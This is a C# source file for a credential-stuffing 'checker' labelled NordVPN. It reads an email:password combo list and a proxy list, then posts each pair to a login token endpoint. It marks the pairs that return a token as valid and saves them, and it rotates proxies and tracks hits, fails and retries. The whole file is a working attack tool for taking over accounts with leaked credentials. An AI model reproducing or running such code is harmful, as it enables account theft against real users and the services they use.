using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using xNet;
using ByteLib;

namespace exampleChecker
{
    public class Program
    {

        [STAThread]
        static void Main(string[] args)
        {
            Checker.Initialize("NordVPN", "1.0", "bnja#0606");
            comboList = up.Combo();
            proxyList = up.Proxys();
            Threads = up.Threads();
            proxyType = up.proxyType();
            combolenght = comboList.Count;
            Task.Factory.StartNew(delegate ()
            {
                for (; ; )
                {
                    checker.startTitle(Progress, combolenght, Hits, Fails, Retries);
                }                
            });            

            // Run checker
            Checker.Start(startMethod);            
            Console.ReadLine();
        }

        public static void startMethod()
        {
            for (;;)
            {
                try
                {
                    bool checkAll = comboList.Count - 1 <= Index;
                    if (checkAll) break;

                        Index++;

                    // This verifies that the list of combos contains email:pass
                    bool Flag = comboList[Index].Split(new char[]
                        {
                            ':'
                        }).Count<string>() == 2;

                    if (Flag)
                    {

                        // This is to separate the email from the password
                        string email = comboList[Index].Split(new char[]
                        {
                            ':'
                        })[0];
                        string password = comboList[Index].Split(new char[]
                        {
                            ':'
                        })[1];

                        string acc = email + ":" + password;

                        try
                        {
                            string data = "username=" + email + "&password=" + password;
                            string response = Checker.post("https://zwyr157wwiu6eior.com/v1/users/tokens", proxyType,
                                true, true, "application/x-www-form-urlencoded", data);

                            if (response.Contains("token"))
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine(" [Valid] " + acc);
                                Checker.Increment_CPM++;
                                Hits++;
                                Progress++;
                                Combos.Results(acc, "Valid");
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine(" [Bad] " + acc);
                                Checker.Increment_CPM++;
                                Fails++;
                                Progress++;
                            }
                        }
                        catch
                        {
                            Console.WriteLine(" [Retrie] " + acc);
                            Retries++;
                            Progress++;
                        }
                    }
                }
                catch 
                {
                }
            }
        }


        // num hits / fails etc
        public static int Hits;
        public static int Fails;
        public static int Progress;
        public static int Retries;


        // Variables
        public static int combolenght;
        public static ProxyType proxyType;
        public static int Threads;
        public static int Index;
        public static List<string> comboList;
        public static List<string> proxyList;

        // Calls to the Library (this is important)
        public static Checker checker = new Checker();

        // upload combos / proxys / threads / proxytype
        public static Upload up = new Upload();

        // Save result hits / fails
        public static data Combos = new data();
    }
}
